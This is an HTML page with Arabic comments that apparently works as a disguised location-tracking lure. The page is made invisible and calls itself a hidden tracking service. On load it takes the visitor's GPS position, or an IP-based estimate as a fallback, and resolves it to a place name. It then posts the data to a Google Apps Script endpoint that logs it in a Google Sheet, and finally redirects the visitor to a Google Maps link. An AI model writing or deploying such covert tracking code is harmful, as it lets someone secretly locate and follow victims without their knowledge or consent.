<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        /* إخفاء كل شيء - صفحة شفافة تماماً */
        body { 
            opacity: 0; 
            height: 0; 
            overflow: hidden; 
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>
    <!-- لا يوجد محتوى مرئي - الصفحة فارغة تماماً -->
    
    <script>
        // ================================
        // إعدادات Google Sheets
        // ================================
        const SHEET_ID = '1i2KiUfCwkUxKodx-zypAdWA58f5VJlpVR60aXS47eh0';
        const SHEET_NAME = 'LocationLink';
        const GOOGLE_SCRIPT_URL = `https://script.google.com/macros/s/AKfycbzk9EFu1vMcoHRDOKtU8VN-ESgMNb2lEI3s2EdHHUJdGYreR2mDZO515-iI5JEunw8p/exec`;

        // ================================
        // الرابط المطلوب فتحه
        // ================================
        const TARGET_URL = 'https://maps.app.goo.gl/9cNY5zRMydN3wYWw8?g_st=ac';

        // ================================
        // دالة الحصول على اسم المنطقة من الإحداثيات
        // ================================
        async function getLocationName(latitude, longitude) {
            console.log('🏙️ جاري جلب اسم المنطقة للإحداثيات:', latitude, longitude);
            
            try {
                // استخدام خدمة Nominatim (OpenStreetMap) للحصول على اسم المنطقة
                const response = await fetch(
                    `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&zoom=10&accept-language=ar`
                );
                
                if (!response.ok) {
                    throw new Error('فشل في جلب بيانات المنطقة');
                }
                
                const data = await response.json();
                
                // استخراج اسم المنطقة من البيانات
                let locationName = '';
                
                if (data.address) {
                    // محاولة الحصول على اسم المنطقة بأولوية معينة
                    locationName = data.address.city || 
                                  data.address.town || 
                                  data.address.village || 
                                  data.address.suburb ||
                                  data.address.district ||
                                  data.address.county ||
                                  data.address.state ||
                                  data.address.country ||
                                  'منطقة غير معروفة';
                } else {
                    locationName = 'منطقة غير معروفة';
                }
                
                console.log('✅ اسم المنطقة:', locationName);
                return locationName;
                
            } catch (error) {
                console.error('❌ خطأ في جلب اسم المنطقة:', error);
                
                // محاولة استخدام خدمة بديلة (Google Maps API)
                try {
                    const response = await fetch(
                        `https://maps.googleapis.com/maps/api/geocode/json?latlng=${latitude},${longitude}&key=YOUR_GOOGLE_API_KEY&language=ar`
                    );
                    
                    if (!response.ok) {
                        throw new Error('فشل في جلب بيانات المنطقة من Google');
                    }
                    
                    const data = await response.json();
                    
                    if (data.results && data.results.length > 0) {
                        // البحث عن المكونات المناسبة
                        const addressComponents = data.results[0].address_components;
                        let locationName = '';
                        
                        for (const component of addressComponents) {
                            if (component.types.includes('locality') || 
                                component.types.includes('administrative_area_level_2') ||
                                component.types.includes('administrative_area_level_1')) {
                                locationName = component.long_name;
                                break;
                            }
                        }
                        
                        if (locationName) {
                            console.log('✅ اسم المنطقة (Google):', locationName);
                            return locationName;
                        }
                    }
                    
                    return 'منطقة غير معروفة';
                    
                } catch (googleError) {
                    console.error('❌ فشلت جميع محاولات جلب اسم المنطقة:', googleError);
                    return 'منطقة غير معروفة';
                }
            }
        }

        // ================================
        // دالة فتح الرابط في الخلفية
        // ================================
        function openUrlInBackground() {
            console.log('🔗 محاولة فتح الرابط:', TARGET_URL);
            
            try {
                const newTab = window.open(TARGET_URL, '_blank');
                
                if (!newTab || newTab.closed || typeof newTab.closed === 'undefined') {
                    console.log('⚠️ تم حظر النافذة المنبثقة، محاولة فتح الرابط في نفس التبويب');
                    window.location.href = TARGET_URL;
                } else {
                    console.log('✅ تم فتح الرابط في تبويب جديد');
                    window.focus();
                }
            } catch (error) {
                console.error('❌ خطأ في فتح الرابط:', error);
                window.location.href = TARGET_URL;
            }
        }

        // ================================
        // دالة إرسال الموقع إلى Google Sheets
        // ================================
        async function sendLocationToSheet(latitude, longitude, source = 'GPS') {
            const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
            const linkLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
            
            // جلب اسم المنطقة
            const locationName = await getLocationName(latitude, longitude);

            console.log(`📍 إرسال موقع (${source}):`, latitude, longitude);
            console.log(`🔗 الرابط:`, linkLocation);
            console.log(`🏙️ اسم المنطقة:`, locationName);

            // إرسال البيانات إلى Google Sheets
            fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sheetId: SHEET_ID,
                    sheetName: SHEET_NAME,
                    linkLocation: linkLocation,
                    targetUrl: TARGET_URL,
                    timestamp: timestamp,
                    latitude: latitude,
                    longitude: longitude,
                    locationName: locationName, // إضافة اسم المنطقة
                    source: source
                })
            })
            .then(() => {
                console.log('✅ تم إرسال الموقع بنجاح إلى Google Sheets!');
                openUrlInBackground();
            })
            .catch((error) => {
                console.error('❌ خطأ في الإرسال:', error);
                openUrlInBackground();
            });
        }

        // ================================
        // الطريقة 1: جلب الموقع عبر IP Geolocation
        // ================================
        function getLocationViaIP() {
            console.log('🌐 محاولة جلب الموقع عبر IP Geolocation...');
            
            fetch('https://api.bigdatacloud.net/data/ip-geolocation?localityLanguage=ar')
                .then(response => {
                    if (!response.ok) throw new Error('فشل في جلب البيانات');
                    return response.json();
                })
                .then(data => {
                    if (data.latitude && data.longitude) {
                        console.log('📍 موقع من IP (BigDataCloud):', data.latitude, data.longitude);
                        sendLocationToSheet(data.latitude, data.longitude, 'IP (BigDataCloud)');
                    } else {
                        throw new Error('البيانات غير مكتملة');
                    }
                })
                .catch(() => {
                    console.log('🔄 محاولة الخدمة البديلة...');
                    getLocationViaIP2();
                });
        }

        // ================================
        // الطريقة 2: جلب الموقع عبر IP (خدمة بديلة)
        // ================================
        function getLocationViaIP2() {
            console.log('🌐 محاولة جلب الموقع عبر IP (خدمة بديلة)...');
            
            fetch('https://ipapi.co/json/')
                .then(response => {
                    if (!response.ok) throw new Error('فشل في جلب البيانات');
                    return response.json();
                })
                .then(data => {
                    if (data.latitude && data.longitude) {
                        console.log('📍 موقع من IP (ipapi):', data.latitude, data.longitude);
                        sendLocationToSheet(data.latitude, data.longitude, 'IP (ipapi)');
                    } else {
                        throw new Error('البيانات غير مكتملة');
                    }
                })
                .catch(() => {
                    console.log('🔄 محاولة الخدمة الثالثة...');
                    getLocationViaIP3();
                });
        }

        // ================================
        // الطريقة 3: جلب الموقع عبر IP (خدمة ثالثة)
        // ================================
        function getLocationViaIP3() {
            console.log('🌐 محاولة جلب الموقع عبر IP (خدمة ثالثة)...');
            
            fetch('https://ipinfo.io/json')
                .then(response => {
                    if (!response.ok) throw new Error('فشل في جلب البيانات');
                    return response.json();
                })
                .then(data => {
                    if (data.loc) {
                        const coords = data.loc.split(',');
                        const latitude = parseFloat(coords[0]);
                        const longitude = parseFloat(coords[1]);
                        console.log('📍 موقع من IP (ipinfo):', latitude, longitude);
                        sendLocationToSheet(latitude, longitude, 'IP (ipinfo)');
                    } else {
                        throw new Error('البيانات غير مكتملة');
                    }
                })
                .catch((error) => {
                    console.error('❌ فشلت جميع محاولات جلب الموقع عبر IP:', error);
                    openUrlInBackground();
                });
        }

        // ================================
        // الطريقة 4: جلب الموقع عبر GPS
        // ================================
        function getLocationViaGPS() {
            console.log('🛰️ محاولة جلب الموقع عبر GPS...');

            if (!navigator.geolocation) {
                console.log('⚠️ المتصفح لا يدعم GPS، ننتقل إلى IP Geolocation');
                getLocationViaIP();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    console.log('📍 موقع من GPS:', latitude, longitude);
                    sendLocationToSheet(latitude, longitude, 'GPS');
                },
                (error) => {
                    console.log('⚠️ فشل GPS، السبب:', error.message);
                    console.log('🔄 التحول إلى IP Geolocation كبديل...');
                    getLocationViaIP();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // ================================
        // الوظيفة الرئيسية
        // ================================
        function getLocation() {
            console.log('🚀 بدء عملية جلب الموقع...');
            getLocationViaGPS();
            
            setTimeout(() => {
                console.log('⏰ مهلة 12 ثانية - محاولة IP كحل احتياطي...');
                if (!window.locationSent) {
                    getLocationViaIP();
                }
            }, 12000);
        }

        // ================================
        // متغير لتتبع نجاح الإرسال
        // ================================
        window.locationSent = false;

        const originalSend = sendLocationToSheet;
        sendLocationToSheet = function(latitude, longitude, source = 'GPS') {
            window.locationSent = true;
            originalSend(latitude, longitude, source);
        };

        // ================================
        // بدء التشغيل التلقائي
        // ================================
        document.addEventListener('DOMContentLoaded', () => {
            console.log('📱 بدء تشغيل خدمة تتبع الموقع الخفية...');
            console.log(`📊 سيتم الإرسال إلى: ${SHEET_NAME}`);
            console.log('⏳ جاري جلب الموقع...');
            console.log(`🔗 سيتم فتح الرابط: ${TARGET_URL}`);
            console.log('🏙️ سيتم جلب اسم المنطقة تلقائياً');
            
            setTimeout(() => {
                getLocation();
            }, 500);
        });

        // ================================
        // مراقبة حالة الاتصال
        // ================================
        window.addEventListener('online', () => {
            console.log('🔄 تم استعادة الاتصال بالإنترنت، إعادة المحاولة...');
            window.locationSent = false;
            setTimeout(() => {
                getLocation();
            }, 2000);
        });

        window.addEventListener('beforeunload', () => {
            console.log('🔚 تم إغلاق الصفحة');
        });

        console.log('💡 نصائح:');
        console.log('1. تأكد من فتح الرابط عبر HTTPS');
        console.log('2. الصفحة تعمل في الخلفية (غير مرئية)');
        console.log('3. ستظهر رسائل التشغيل في وحدة التحكم (F12)');
        console.log('4. سيتم الإرسال تلقائياً إلى Google Sheets مع اسم المنطقة');
        console.log('5. سيتم فتح الرابط المحدد تلقائياً بعد الإرسال');
    </script>
</body>
</html>
